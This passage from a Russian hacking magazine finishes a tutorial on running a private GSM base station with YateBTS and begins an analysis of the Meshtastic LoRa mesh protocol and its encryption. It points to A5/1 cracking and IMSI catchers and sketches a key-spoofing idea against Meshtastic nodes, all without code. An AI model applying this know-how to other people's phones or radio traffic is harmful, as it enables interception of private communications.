на актуальных версиях PHP. Конкретно для запуска нужна версия PHP5, но это
можно легко исправить, аккуратно поменяв несколько мест в коде. Если
запустить без изменений, то ошибка ясно даст понять, в чем заключается
проблема:


  [Wed Dec 24 16:58:21.655074 2025] [php:error] [pid 13911] [client 127.0.
  0.1:41030] PHP Fatal error:  Array and string offset access syntax with
  curly braces is no longer supported in /usr/local/share/yate/nipc_web/
  ansql/lib.php on line 3761

Открываем файл /usr/local/share/yate/nipc_web/ansql/lib.php, идем
на строку 3761:


$bits .= str_pad(base_convert(ord($header{0}), 10, 2), 8, '0',
STR_PAD_LEFT);

Меняем ее на такую:


$bits .= str_pad(base_convert(ord($header[0]), 10, 2), 8, '0',
STR_PAD_LEFT);

Дело в том, что в новых версиях для доступа к элементу массива нужно
использовать квадратные, а не фигурные скобки. Вторая ошибка находится
в этом же файле, но в строке 3787:


  [Wed Dec 24 17:00:58.229349 2025] [php:error] [pid 13912] [client 127.0.
  0.1:49124] PHP Fatal error:  Array and string offset access syntax with
  curly braces is no longer supported in /usr/local/share/yate/nipc_web/
  ansql/lib.php on line 3787

Делаем такие же действия с этой строкой. Было:


$headerlen = 4 + ($bits{4} == 0 ? '2' : '0');

Стало:


$headerlen = 4 + ($bits[4] == 0 ? '2' : '0');

Следующая ошибка будет в /usr/local/share/yate/nipc_web/modules/
default/subscribers.php:


  [Wed Dec 24 17:07:51.198170 2025] [php:error] [pid 13500] [client 127.0.
  0.1:59112] PHP Fatal error:  Uncaught TypeError: count(): Argument #1 (
  $value) must be of type Countable|array, string given in /usr/local/
  share/yate/nipc_web/modules/default/subscribers.php:663\nStack trace:\
  n#0 /usr/local/share/yate/nipc_web/modules/default/subscribers.php(57):
  get_regexp()\n#1 /usr/local/share/yate/nipc_web/lib/menu.php(111):
  list_subscribers()\n#2 /usr/local/share/yate/nipc_web/main.php(67):
  get_content()\n#3 {main}\n  thrown in /usr/local/share/yate/nipc_web/
  modules/default/subscribers.php on line 663, referer: http://127.0.0.1/
  nipc/main.php?module=subscribers&method=country_code_and_smsc

На строке 663 видим следующую конструкцию:


if (!count($content))
    return array(true, "");

Меняем ее на исправленную:


if (is_countable($content)) {
    if (count($content) === 0) {
        return array(true, "");
    }
} else {
    if (strlen(trim((string)$content)) === 0) {
        return array(true, "");
    }
}


             INFO

                            Если у тебя будут ошибки при сохранении кон‐
                        фигов, проверь  группу  владельца файлов в /
                   usr/local/etc/yate/ — он должен состоять
                        в группе yate ! У группы yate должны быть пра‐
                       ва на редактирование всех файлов этой дирек‐
                        тории.


Теперь веб‑интерфейс уже в целом запускается, но имеет несколько неоче‐
видных ошибок, которые выстрелят уже в процессе работы, а без логов отло‐
вить их не получится. Например, ошибка в файле nipc.js проявляется только
при попытке запросить клиентов, а возникает она из‑за отсутствия функции
buildDate. Исправляется эта ошибка добавлением нужной функции в файл /
usr/local/share/yate/scripts/nipc.js после блока require :


function buildDate(ts)
{
    if (!ts)
        return "-";


    ts = parseInt(ts);
    if (isNaN(ts) || ts <= 0)
        return "-";


    var d = new Date(ts * 1000);


    function pad(n)
    {
        if (n < 10)
            return "0" + n;
        return "" + n;
    }


    return d.getFullYear() + "-" +
           pad(d.getMonth() + 1) + "-" +
           pad(d.getDate()) + " " +
           pad(d.getHours()) + ":" +
           pad(d.getMinutes()) + ":" +
           pad(d.getSeconds());
}

Последняя ошибка связана с коммуникацией PHP и Yate, а именно в чтении
данных из сокета. Чтобы ее исправить, идем в /var/www/html/nipc/web/
lib_proj.php,        удаляем       функции       get_socket_response
и parse_socket_response и заменяем их исправленными версиями:


function parse_socket_response($socket_response)
{
    $table_array = array();


    if (is_array($socket_response)) {
        if (isset($socket_response[0]) && $socket_response[0] ===
false)
            return $table_array;



        $socket_response = $socket_response[1] ?? '';
    }


    $socket_response = trim((string)$socket_response);
    if ($socket_response === '')
        return $table_array;


    if (strpos($socket_response, '|') !== false) {
        $lines = preg_split("/\r\n|\n|\r/", $socket_response);
        foreach ($lines as $line) {
            $line = trim($line);
            if ($line === '') continue;
            if (stripos($line, 'IMSI') === 0) continue;
            if (strpos($line, '---') !== false) continue;
            if (strpos($line, '|') === false) continue;


            $p = array_map('trim', explode('|', $line));
            if (count($p) < 2) continue;


            $table_array[] = array(
                'IMSI'   => $p[0],
                'MSISDN' => $p[1],
            );
        }
        return $table_array;
    }


    $res = explode("--------------- ---------------",
$socket_response);
    if (!isset($res[1]) || !strlen(trim($res[1])))
        return $table_array;


    $titles = explode("           ", trim($res[0]));
    $subs = explode("\n", trim($res[1]));


    $data_to_display = array();
    for ($i=0; $i<count($subs); $i++)
        $data_to_display[] = explode("   ", trim($subs[$i]));


    foreach ($data_to_display as $key => $data) {
        $table_array[$key] = array(
            trim($titles[0]) => trim($data[0] ?? ''),
            trim($titles[1]) => trim($data[1] ?? ''),
        );
    }


    return $table_array;
}


function get_socket_response($command, $marker_end)
{
    global $yate_ip, $default_ip, $default_port;


    if (!shell_exec('pidof yate'))
        return [false, "Please start YateBTS before performing this
action.", false];


    if (!$yate_ip)
        return [false, "Please set Yate IP in configuration file.",
false];


    $socket = new SocketConn($default_ip, $default_port);
    if (strlen($socket->error))
        return [false, "There was a problem with the socket
connection. Error reported is: ".$socket->error, false];


    $out = $socket->command($command, $marker_end);


    return [true, (string)$out, null];
}

После всех операций можно открыть в браузере панель настройки YateBTS,
которая по умолчанию будет доступна по адресу http://127.0.0.1/nipc .
Вывод вкладки Subscribers и других тоже должен будет заработать.


Как бороться с ошибками
Если возникнут другие ошибки, придется заглянуть в логи Apache, а ошибки
в JS-коде можно мониторить при запуске yate с подробным логированием:


 yate -vvvvv


Также возможны ошибки, связанные с уровнем доступа группы yate к фай‐
лам, — тут остается только мониторить логи и исправлять ошибки по мере
появления. Либо просто запускать ядро от рута:


 sudo yate -vvvvv


Если ошибка возникнет при использовании PHP, веб‑интерфейс сам об этом
сообщит.



Включаем поддержку звонков
Теперь нужно подключить локальный SIP-сервер — он понадобится для звон‐
ков внутри сети, которые в дефолтном конфиге не настроены. Вероятно, раз‐
работчики думали, что будет использоваться внешний SIP, но легче всего
будет все же использовать внутренний. Для его активации нужно только поп‐
равить несколько конфигов. Делается это в файле yate.conf :


[general]
modload=disable


[modules]
ysipchan.yate=true
regfile.yate=true
accfile.yate=true
regexroute.yate=true
rmanager.yate=true

После этого пока ничего перезапускать не нужно, а нужно настроить еще сам
ysip в файле ysipchan.conf :


[listener public]
type=udp
enable=yes
addr=0.0.0.0
port=5060

Тут включается собственно SIP-сервер, а слушать он будет на всех интерфей‐
сах на 5060-м порте.
  Еще нужно создать пользователя, от имени которого Yate сможет работать
с SIP. В файле regfile.conf добавляем пользователя admin :


[general]


[admin]
password=admin

Имя пользователя — это название секции, а пароль указывается аргументом
(то есть тут описано стандартное admin / admin ).
   Вот теперь перезапускаем Yate. Чтобы убедиться, что модуль загрузился,
можно проверить это в rmanager :


telnet 127.0.0.1 5038


module list

Если в списке появился ysipchan — все хорошо и можно переходить к под‐
ключению SIP к самому ядру Yate.


Регистрируем клиентов
Когда базовая станция приведена в функциональное состояние, последний
важный шаг — разрешить клиентам к ней подключаться. У каждой станции
есть белый список клиентов, которым разрешено подключение, и сейчас,
из коробки, он пуст. Для настройки нужно перейти в первый пункт меню
веб‑интерфейса — Subscribers.





                  Интерфейс настройки белых списков

Поддерживаются два варианта: использовать регулярное выражение для IMSI
либо добавлять отдельные IMSI клиентов через функцию Add subscriber .
При первом варианте номер абонента для нового клиента будет назначен
автоматически. У всех моих тестовых симок IMSI начинается с цифр 9997, так
что я просто вписал регулярное выражение. Для этого нажимаем Modify
и вписываем регулярку:


^9997

Все IMSI, которые начинаются на 9997, будут автоматически приняты, и им
будет выделен номер абонента.


           IMSIКак искать     SIM-карты
Если ты не знаешь IMSI своей симки, можно спокойно пропустить этот пункт
и вернуться к нему позже. После попытки подключения к сети отклоненные
IMSI окажутся в списке Rejected IMSIs , где можно будет подсмотреть инте‐
ресующий номер. А на  вкладку Online  Subscribers попадут  клиенты,
которые в данный момент подключены к базовой станции.





                            Подключенные клиенты




Дальше идем в меню Country Code And SMSC , где меняем Country Code
на любой желаемый — сейчас неважно, какой он будет. В пункте SMSC (Short
Message Service Center) нужно указать номер роутера SMS, который в идеале
не  должен  пересекаться с номерами из пула MSISDN  (Mobile  Station
International  Subscriber  Directory Number)  или,  проще, не  должен быть
номером телефона другого абонента. Я поставил стандартный 111.
   Gateway SOS нужно оставить пустым — это номер экстренной службы,
на который будут переадресованы экстренные вызовы в твоей сети. Ставить
его на тестовой станции нельзя, чтобы, если кто‑то решит воспользоваться
этой функцией, он не оказался отрезан от помощи. После редактирования
сохраняем и идем дальше.
  В меню Outgoing нужно вписать все настройки, которые мы задали
для работы SIP. Протокол выбираем SIP, логин и пароль — которые задали
в файле регистрации (в моем случае это admin / admin ).
   Как адрес сервера нужно указать свой локальный IP, поскольку SIP-сервер
слушает на всех интерфейсах. Не забудь поставить галочку на Enabled и сох‐
ранить настройки. Секцию с расширенными настройками можно не трогать,
главное — проверить, что транспортным протоколом выбран UDP.





                          Настройки голосовой связи


Настраиваем радио
Последняя ненастроенная часть — это радио нашей базовой станции. Нач‐
нем с вкладки GSM, которая отвечает за основные параметры. Первая важ‐
ная настройка — Radio.Band , которая задает рабочую частоту базовой стан‐
ции. Всего частот на выбор четыре, а отличаются они своим назначением
и регионом использования. DCS используется больше в Европе в городах,
где большая плотная застройка, а PCS был разработан для США и Канады.
Мы же остановимся на GSM и EGSM, который еще называют Extended GSM
900.





                               Настройка частоты




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИCOVER STORY
          ЭТО БАЗА!
           КАК ПОДНЯТЬ СВОЮ БАЗОВУЮ
          СТАНЦИЮ GSM С ПОМОЩЬЮ
                                YATEBTS





           WARNING

                          Параметры радиоканала (диапазон, ARFCN, уро‐
                       вень мощности) в реальных сетях определяются
                         регулятором и условиями разрешения на исполь‐
                       зование радиочастот. Упомянутые значения при‐
                           водятся исключительно как пример конфигурации
                           лабораторного   стенда  и  не  предназначены
                       для использования в реальном эфире.


Дальше нужно выбрать канал. Все каналы сгруппированы по частотным
диапазонам, которые я перечислял выше. Для теста можешь выбрать любой
канал, который находится в разделе выбранного диапазона, — для GSM850,
к примеру, подойдет канал 136 (и все остальные из этой категории)


             INFO

                           Запомни  точную  частоту  выбранного  канала.
                   В случае неполадок можно будет с помощью дру‐
                        гой SDR посмотреть, действительно ли там что‑то
                            происходит.


Параметр Identity.MCC (Mobile Country Code) указывает клиенту страну
базовой станции. Сюда можно вписать любое трехзначное число, для тес‐
товой сети можно использовать 001 или поставить что‑то более красивое.
Identity.MNC (Mobile Network Code), в свою очередь, означает идентифика‐
тор конкретного оператора в рамках указанной страны и кодируется двумя
или тремя цифрами. Поля MCC и MNC вместе формируют PLMN ID (Public
Land Mobile Network ID), и каждая SIM-карта знает свой родной PLMN, чтобы
отличать домашнюю сеть от роуминговой, а еще с его помощью симка
понимает, куда обращаться за авторизацией абонента и какие правила
роуминга применять. Этот параметр тоже можно выставить любым — я пос‐
тавил просто 01.


        WWW

                          Список всех выделенных MCC и MNC определя‐
                        ется в рекомендации ITU-T E.212 , а в удобном
                      виде доступен на специальных сайтах , где можно
                           выбрать, чей PLMN прикарманить себе для экспе‐
                          риментов. Например, MCC 901 + MNC 03 принад‐
                       лежат спутниковой сети Iridium.


Параметры Identity.CI , Identity.BSIC.BCC и Identity.BSIC.NCC можно
оставить со значениями по умолчанию. Identity.CI или Cell ID — это иден‐
тификатор соты, конкретной ячейки базовой станции. Он помогает опре‐
делить, к какой вышке сейчас подключен абонент, и помогает определять его
местоположение. BSIC (Base Station Identity Code) — это более общий ID
для всей базовой станции. Этот ID помогает клиенту узнавать свои базовые
станции, особенно когда разные базовые станции используют одни и те же
частоты. Он состоит из NCC (Network Color Code) и BCC (Base Station Color
Code), где оба поля имеют длину в 3 бита.
   Identity.ShortName указывает короткое имя базовой станции — тут мож‐
но проявить фантазию и назвать свою вышку как угодно.
  И напоследок еще два важных параметра. Оба они находятся в разделе
Radio.PowerManager и отвечают за настройку мощности передаваемого
сигнала. MaxAttenDB задает максимальную аттенюацию, то есть самое
большое ослабление. В документации YateBTS написано, что этот параметр
задает минимальный уровень выходной мощности.
   Второй параметр — MinAttenDB , отвечает он за минимальную атте‐
нюацию, то есть самое маленькое ослабление. Как ты уже догадался, этот
параметр  задает  максимальный  уровень  выходной мощности  передачи
и должен быть меньше MaxAttenDB либо равен ему.
  Для максимальной мощности можно установить оба параметра в 0, но я
рекомендую начать с 40 и постепенно уменьшать, пока сигнал не станет при‐
емлемым. Помни, что слишком высокая мощность может не только привести
к быстрому обнаружению твоей лаборатории людьми в погонах, но и к пов‐
реждению оборудования, если антенны подобраны неидеально или что‑то
собрано неправильно.


ЗАПУСК

Ключей запуска у Yate немного — из настраиваемых возможностей доступно
разве что увеличение детализации логов:


  ubuntu@ubuntu:~$ yate -h
  Usage: yate [options] [commands ...]
  -h, --help     Display help message (this one) and exit
  -V, --version  Display program version and exit
  -v             Verbose logging (you can use more than once)

Больше подробностей нам не помешает, особенно при первом запуске.
Запускаем:


yate -vvv





Если ничего не взлетело на воздух, а в комнате не запахло горелыми ради‐
одеталями — наш стенд готов! Можно проверять, что телефоны подключают‐
ся, все функции работают, и начинать экспериментировать.
   Если же при  запуске  ты видишь  в  консоли  большинство записей
про underrun — это значит, что большая часть сообщений не попадает в нуж‐
ные тайминги и, вероятнее всего, где‑то есть бутылочное горлышко, которое
мешает быстрой передаче данных.


  ubuntu@ubuntu:~$ yate -vvv
  ...
  2025-12-25_18:39:06.370783 <gsmtrx:MILD> Transmit underrun by 10
  timeslots [0x749c0c01c7e0]
  skipped 1439
  skipped 970
  2025-12-25_18:39:06.385338 <gsmtrx:MILD> Transmit underrun by 10
  timeslots [0x749c0c01c7e0]
  skipped 1952
  skipped 1079
  skipped 653
  2025-12-25_18:39:06.398852 <gsmtrx:MILD> Transmit underrun by 7
  timeslots [0x749c0c01c7e0]
  skipped 1461
  skipped 886
  skipped 289
  2025-12-25_18:39:06.413210 <gsmtrx:MILD> Transmit underrun by 7
  timeslots [0x749c0c01c7e0]
  skipped 991
  skipped 182
  2025-12-25_18:39:06.427900 <gsmtrx:MILD> Transmit underrun by 10
  timeslots [0x749c0c01c7e0]

Если такие сообщения редки, это не помешает работе, но большое их
количество не даст клиентам завершить синхронизацию. Для устранения этой
проблемы проверь, подключена ли SDR по USB 3.0, проверь кабель и нас‐
тройки хостовой системы. Ну а если видишь какие‑то другие ошибки — вни‐
мательно читай логи, там обычно прямо и подробно описано, что нужно сде‐
лать для починки.


САМ СЕБЕ ОПЕРАТОР

Чтобы проверить, что все работает как надо, просто подключимся к сети
с реальных телефонов! Обе SIM-карты я зарегистрировал в ядре Yate
заранее.
   Начнем с отправки SMS. Для этого есть два пути: плагин для YateBTS
и отправка SMS с другого телефона. Для установки плагина нужно скачать
его, собрать и подключить к Yate:


git clone https://github.com/trpyn/YateBTS_smssend
cd YateBTS_smssend
make
sudo make install

После этого придется перезапустить Yate и подключиться к ядру БС по Telnet:


telnet 127.0.0.1 5038

Смотрим справку по smssend:


  help smssend
  smssend <MSISDN> <CALLER> <message>
  send text messages to a particular MS

Для отправки сообщения нужен номер MSISDN (читай: номер телефона)
получателя. Посмотреть его можно в веб‑админке YateBTS на вкладке Online
Subscribers (или вспомнить, какой ты задавал сам, если добавлял IMSI
по одному). Узнав номер, отправляем сообщение:


smssend 120123959 111 hello
message succesfuly sent.

Теперь  проверяем телефон  с MSISDN  120123959 и видим там SMS
от номера 111!





                    SMS доставлено

Зная MSISDN, можно проверить связь между двумя клиентами — просто
отправив SMS с одного телефона на другой, как если бы это была обычная
сеть. Если все работает корректно, доставка сообщения занимает всего нес‐
колько секунд. Если же сообщение не дошло — обязательно посмотри лог
Yate, там будут детали ошибки. Лично у меня все заработало правильно
с первого раза.
  Для голосового звонка также не нужно больше ничего изобретать — дос‐
таточно позвонить по номеру другого аппарата в сети. Звук работает отлично,
как и определение номера. Номер, напомню, можно задать произвольный
в разделе Subscribers веб‑админки, и тут нет особых требований по фор‐
мату — он может не иметь кода страны, состоять всего из пары цифр
или иметь другие необычные свойства. Не забывай только, что SIP должен
быть настроен и активен, так что, если ты пропустил эту часть настройки,
звонки работать не будут.





Бонус
Есть и более интересные действия, которые можно совершить, имея свою
базовую станцию, например попробовать провернуть старую атаку на шиф‐
рование A5/1. Радужные таблицы для атаки можно найти (архив занимает
порядка 1,6 Тбайт) или сгенерировать самостоятельно, а программное обес‐
печение для работы с ними есть на GitHub .
  Еще можно попробовать на своей базовой станции настроить IMSI-перех‐
ватчик, который будет сохранять данные всех новых клиентов. На «Хакере»
есть старая статья о них, которая, несмотря на свой почтенный возраст, дает
хорошее представление об этой технологии.
  Но помни: любые действия, связанные с перехватом, анализом

или ослаблением защиты чужих коммуникаций, затрагивают тай‐

ну связи и могут подпадать под уголовную ответственность.



Что делать со всей этой информацией — решать только тебе. Но теперь, ког‐
да ты видишь, как легко прикинуться оператором и творить непотребства, ты
чуть лучше будешь готов и тоже загоришься исследованием безопасности
сотовых сетей. Береги себя и не болтай лишнего по телефону! © X
COVER STORY





Meshtastic —  это   децентрализованная
меш‑сеть, позволяющая передавать корот‐
кие  сообщения  на  десятки  километров
без интернета, через цепь промежуточных                                                                                             mr.grogrig
                                                                                                 @grogrigsузлов — нод. Она основана на протоколе
LoRa,  созданном  для  передачи  данных
на большие расстояния. Сегодня мы узна‐
ем, как устроен Meshtastic изнутри, какие
у него есть проблемы и ограничения.


           WARNING

                         Meshtastic —  это  радиолюбительский  экспе‐
                          риментальный проект для обмена сообщениями
                         между участниками туристических групп, мероп‐
                       риятий и хобби‑сообществ. Он не предназначен
                       для   сокрытия   противоправной   деятельности
                      или обхода требований законодательства. Также
                         Meshtastic использует общедоступные криптоал‐
                          горитмы, не сертифицированные ФСБ РФ. Такие
                          средства допустимы для личного использования,
                      но  не  могут  применяться  в  регулируемых
                        информационных системах.



УСТРОЙСТВА

Для экспериментов с «Мештастиком» потребуется специальное устройство.
Китайцы продают готовые наборы за полторы‑две тысячи рублей. Достаточно
поставить свежую прошивку и спарить с телефоном по Bluetooth — и у тебя
сразу появится возможность писать другим участникам сети. Устройствами
можно управлять через USB по виртуальному COM-порту и TCP-пакетами
по обычному Wi-Fi.


           WARNING

                             Никогда не  включай  устройство без антенны.
                   В лучшем случае оно не заработает, в худшем —
                          выйдет из строя.


Я купил на тест  несколько готовых антенн и нод, поэтому смело могу
рекомендовать Heltec v3. Для домашнего использования нужно докупить нор‐
мальную антенну к бескорпусной плате, а для переносного варианта — взять
устройство в корпусе, у которого есть аккумулятор и переходник на SMA-
выход. Список доступных устройств весьма обширен, просто ищи слово
Meshtastic на маркетплейсе и выбирай ноду с подходящей рабочей частотой
для твоего региона. Для России это 868 МГц.


           WARNING

                   В  РФ   диапазон  868  МГц   предназначен
                       для  устройств с  ограничениями по мощности
                      и времени передачи (duty cycle ≤1%). Исполь‐
                       зование Meshtastic без соблюдения этих огра‐
                          ничений может квалифицироваться как наруше‐
                      ние правил использования радиочастотного спек‐
                        тра (статья 13.4 КоАП РФ). Перед эксплуатацией
                        рекомендуем ознакомиться с требованиями ГКРЧ
                          к устройствам малого радиуса действия.


Настройки сети зависят от локального сообщества. Можешь ознакомиться
со списком местных групп .
   Прошивка требует установки драйверов. Следуй инструкции , и у тебя все
получится. Я не буду детально описывать весь процесс, но ты можешь пос‐
мотреть подробное руководство на канале MeshWorks .


МОДУЛЯЦИЯ СИГНАЛА

На физическом уровне (PHY) LoRa использует Chirp Spread Spectrum
(CSS) — метод, в котором данные передаются с помощью особых волн,
называемых чирпами. Чирп — это сигнал, частота которого плавно растет
или падает по времени. На спектрограмме такие сигналы выглядят как нак‐
лонные линии, похожие на зубья пилы.





                           Так выглядят чирпы

Немодулированный чирп — это просто плавный подъем частоты (up-chirp)
от нижней части полосы к верхней, после чего частота «перепрыгивает» назад
вниз и цикл повторяется. Down-chirp — то же самое, только в обратную сто‐
рону.
  LoRa передает данные символами , и каждый символ — это один чирп
со своим сдвигом по частоте . Этот сдвиг и есть символ, то есть «число»,
которое передается. Модулированный чирп всегда заканчивается в той же
точке, где и  начинался. На  картинке он передает символы  0, 64, 32,
95 из 128 возможных.





              Модулированный чирп как будто смещен по фазе

Характеристики сети зависят от двух значений: константы spreading factor (SF)
и bandwitch (BW) — ширины канала. По стандарту LoRa SF может принимать
значения от 7 до 12. Далее по формуле 2^SF считается максимально воз‐
можное количество символов. Например, SF7 дает 2⁷ = 128. Время переда‐
чи символа зависит от SF и ширины канала:


Ts = 2^SF / BW

Например, при BW = 125 кГц и SF = 7 длительность трансляции одного сим‐
вола — 1,024 мс.
   Коротко говоря, высокий SF увеличивает дальность и устойчивость сиг‐
нала, но снижает скорость передачи. Низкий, наоборот, увеличивает ско‐
рость обмена данными, но снижает качество приема на длинных дистанциях.
Собственно, эти параметры задаются пресетами сети:
 • LongFast (SF 7, BW 250) — быстрее, но с меньшей дальностью;
 • LongMedium (SF 9–10, BW 125) — компромисс;
 • LongSlow (SF 12, BW 125) — максимальная дальность, минимальная
   скорость.


СТРУКТУРА ПАКЕТОВ LORA

Все передаваемые LoRa данные кодируются чирпами. Пакет LoRa состоит:
 • из преамбулы — набора чирпов для синхронизации;
 • заголовков — опциональной битовой структуры;
 • полезной нагрузки — данных инкапсулированного протокола;
 • контрольной суммы — опционального CRC-16.

Пойдем по порядку. В преамбуле три части:
 • N восходящих чирпов для синхронизации, 16 по документации;
 • 2 модулированных чирпа — sync word, идентификатор сети;
 • 2,25 нисходящего чирпа.





Начало преамбулы позволяет приемнику «сверить часы», чтобы правильно
поделить сигнал на фреймы. Идентификатор сети нужен, чтобы разные сети,
основанные на LoRa, могли отличить свои пакеты от чужих. Для Meshtastic он
равняется 0x2B . Два с четвертью нисходящих чирпа сигнализируют о конце
преамбулы.
  В зависимости от параметров сети заголовок включается (explicit mode)
или не включается (implicit mode) в пакет LoRa. Структура заголовка такова:
 • Length — 8 бит, длина полезной нагрузки;
 • CR — 3 бита, coding rate;
 • CRC — 1 бит, флаг наличия Payload CRC;
 • Header CRC — 8 бит, контрольная сумма.

CR — коэффициент избыточного кодирования. Он  определяет, сколько
дополнительных  (помехозащитных) битов  стоит  включать —  от  одного
до четырех на каждый блок из четырех битов полезной нагрузки. От флага
CRC зависит, будет ли добавлено 2 байта CRC-16 к концу полезной нагрузки.
   Заголовок длиной в 20 бит кодируется так, чтобы всегда укладываться
в восемь чирпов. Полезная нагрузка кодируется с тяжелой математикой,
которую я не буду здесь описывать. В любом случае она лежит на плечах зак‐
рытого модуля Semtech SX1262, через который прошивка общается с миром.





                  Кодирование полезной нагрузки в чирпы


СТРУКТУРА ПАКЕТОВ MESHTASTIC

Пакет LoRa оставляет 255 байт для полезной нагрузки. Пакет Meshtastic также
имеет свой заголовок:
 • Destination — 4 байта, NodeID получателя;
 • Sender — 4 байта, NodeID отправителя;
 • Packet ID — 4 байта, номер пакета;
 • Flags — 1 байт, флаги;
 • Channel hash — 1 байт, хеш от данных канала;
 • Next-hop — 1 байт;
 • Relay Node — 1 байт.

Отправитель и получатель — NodeID конкретной ноды, это нижние 4 байта
от MAC-адреса встроенного блютус‑модуля. Номер пакета — случайное зна‐
чение.
   Флаги указывают:
 • оставшийся пакету HopLimit, тот же TTL в терминах TCP;
 • WantAck — ждем ли мы подтверждения доставки;
 • ViaMQTT — пришел ли пакет из MQTT;
 • HopStart — изначальное значение HopLimit.

MQTT — дополнительный способ связи через интернет. Ноды передают
через  него  пакеты,  чтобы  достучаться  до  дальних  участников  сети.
Это помогает увидеть друг друга, пока сеть еще маленькая. Но фактически
избыточно, когда сеть уже покрыла весь город.
   Согласно коду , хеш канала — это XOR всех байтов друг на друга от имени
и ключа канала. Судя по комментариям к структуре PacketHeader, Next-
hop — это последний байт от NodeID предпочитаемой следующей ноды, что
используется для оптимизации доставки личных сообщений. Relay node —
последний байт от NodeID предпочитаемой ноды‑ретранслятора. Оба поля
нужны для маршрутизации пакетов и уменьшения количества широковеща‐
тельного трафика.
   Дальше идет полезная нагрузка. Вычитаем 16 байт заголовка (и 2 байта
CRC-16) из 255 и получаем максимальный размер в 237 байт. Полезная наг‐
рузка хранится в protobuf-пакете Data . Он может приходить как в открытом
виде, если это сервисное сообщение, так и в зашифрованном, если личное.
Не шифруется только заголовок, нужный для маршрутизации пакета.


*
 * (Formerly called SubPacket)
 * The payload portion fo a packet, this is the actual bytes that
are sent
 * inside a radio packet (because from/to are broken out by the
comms library)
 */
message Data {
  PortNum portnum = 1;
  bytes payload = 2;
  bool want_response = 3;
  fixed32 source = 5;
  fixed32 request_id = 6;
  fixed32 reply_id = 7;
  fixed32 emoji = 8;
  optional uint32 bitfield = 9;
}

Так как это protobuf, все поля фактически опциональны. PortNum указывает
на тип пакета, от него зависит содержимое payload . Например, тип сооб‐
щения TEXT_MESSAGE_APP говорит, что в payload будет текст UTF-8. А при
NODEINFO_APP в payload будет протобаф‑сообщение NodeInfo . С учетом
оверхеда самого протобафа на пользовательские данные остается пример‐
но 200 байт, или 100 букв кириллицей в UTF-8.


ВСТРОЕННОЕ ШИФРОВАНИЕ

Проект Meshtastic полностью открыт, но плохо документирован. На момент
написания статьи актуальная версия прошивки — 2.7.15.


Channels
Групповые чаты, или, как они тут называются, каналы, по умолчанию имеют
ключ шифрования AQ== . Под слоем Base64 скрывается байт 0x01 . Все сооб‐
щения в канале шифруются по алгоритму AES-CTR. AES был выбран по той
причине, что он имеет аппаратную поддержку на большинстве плат по типу
ESP-32.
   Общаться в чате можно, только зная ключ канала. Максимальная длина
ключа — 256 бит. Подобрать такой ключ практически нереально. Но если зло‐
умышленник получит хотя бы одно устройство из сети, весь канал будет ском‐
прометирован. Атакующий получит доступ как к старым, заранее собранным,
так и  к новым сообщениям. Такой тип  связи подходит для маленькой
доверенной группы, но для публичных чатов ваши сообщения все равно что
не шифруются вовсе.


Direct Messages
С версии 2.5.0 Meshtastic стал поддерживать криптографию с открытыми клю‐
чами. Но пока это коснулось только личных сообщений.
   Каждое устройство в момент первого включения генерирует открытый
и закрытый ключ. Это постоянные ключи в формате X25519 длиной 32 байта.
Открытые ключи распространяются в каналах через NodeInfo . Их можно уви‐
деть в панели отладки официального приложения для телефона.


09.12.2025 20:53:37 [NodeInfo]
num: 1122334455 (!430fae19)
user {
  id: "!430fae19"
  long_name: "Meshtastic ae19"
  short_name: "ae19"
  macaddr: "\201\254\360\017\352\031"
  hw_model: HELTEC_V3
  public_key: "\145\003\327\372\214\221\062\177\307\014\361\140\037\
205\047\313\030\221\205\004\352\207\201\035\255\066\347\314\361\202\
110\012"
  is_unmessagable: false
}
channel: 1

Наше устройство постоянно запоминает чужие ключи. Сеть не имеет единого
центра сертификации, который мог бы подписывать валидные ключи. Поэтому
в сети действует политика TOFU (Trust On First Use) — первый ключ, который
мы увидим для этой ноды, считается валидным. Если ключи внезапно меня‐
ются, интерфейс отобразит красный ключик над конкретной нодой. Это может
говорить об атаке или ручной смене ключей.
   Большинство устройств ограничено ста записями в NodeDB, но мобиль‐
ное приложение может запоминать намного больше. Новые записи вытес‐
няют старые, так что теоретически можно создать сто поддельных нод и сто
первой нодой подменить чужую запись на свою. Однако это не сработает,
если нода добавлена в избранные, — информация о них не удаляется из базы
ни при каких обстоятельствах.
   Перед отправкой сообщения нода вычисляет общий секрет из нашего зак‐
рытого ключа и открытого ключа собеседника. Получатель создает точно
такой же секрет из своего закрытого ключа и открытого ключа отправителя.
Алгоритм похож на получение общего секрета в OMEMO и даже использует
те же эллиптические кривые X25519.
   Так как документация внятно ничего не объясняет, посмотрим, как про‐
исходит шифрование в исходниках . Начнем с функции encryptCurve25519 .
Она генерирует четыре случайных байта extraNonce . Затем через setDHKey
и вложенный вызов setDHPublicKey публичный ключ собеседника смешива‐
ется с нашим приватным ключом, и получается shared_key на выходе. Даль‐
ше ключ дополнительно хешируют. Вызов initNonce формирует 13-байтный
nonce, склеивая packetId , fromNode и extraNonce .
   Наконец, собранные байты сообщения, nonce и shared_key передаются
функции aes_ccm_ae . Этот же алгоритм  ( AES-CCM ) применяется в  Wi-Fi
и Bluetooth Low Energy. Он состоит из шифрования (AES-CTR) и аутентифика‐
ции (CBC-MAC). На выходе алгоритма получаем bytesOut — зашифрованное
сообщение — и auth — MAC (Message Authentication Code). Он записывается
в конце шифротекста.
   Схема гарантирует, что без знания общего секрета изменить существу‐
ющее сообщение не выйдет, не сломав MAC, а повторно отправить перех‐
ваченное не получится из‑за packetId — второй пакет с таким же номером
будет отброшен. Валидный пакет может собрать только легальный отпра‐
витель. По крайней мере, пока в реализации не найдут ошибку.


ЛОВИМ ПАКЕТЫ В SDR

Мне посчастливилось раздобыть китайский клон HackRF, а значит, мы обя‐
зательно должны увидеть пакет «Мештастика»! Работать с SDR проще всего
в Ubuntu. Подключаем HackRF и устанавливаем SDR++.


           WARNING

                          Описанный  эксперимент  проводился на  собс‐
                          твенном оборудовании и собственных узлах сети.
                          Перехват и  анализ  радиопередач  третьих лиц
                       без их согласия может нарушать  тайну  связи
                          (статья 138 УК РФ).


Теперь необходимо выбрать частоту, за которой мы будем следить. Базовая
частота «Мештастика» в моем регионе — 868 МГц. Однако в настройках ука‐
зан Frequency Slot = 2 , и частота смещается на 869,075 МГц.
   Если передатчик далеко, в SDR++ можно подкрутить софтварное усиление
сигнала. Но я расположил устройство рядом с антенной приемника, так что
сигнал отлично виден и без усиления. Примерно через 30 с после включения
девайс посылает какой‑то пакет LoRa, поэтому я просто ребутил устройство,
меняя параметры отображения, пока не увидел уверенный прием сигнала.
  На стандартных настройках сигнал виден, но совершенно не похож на кра‐
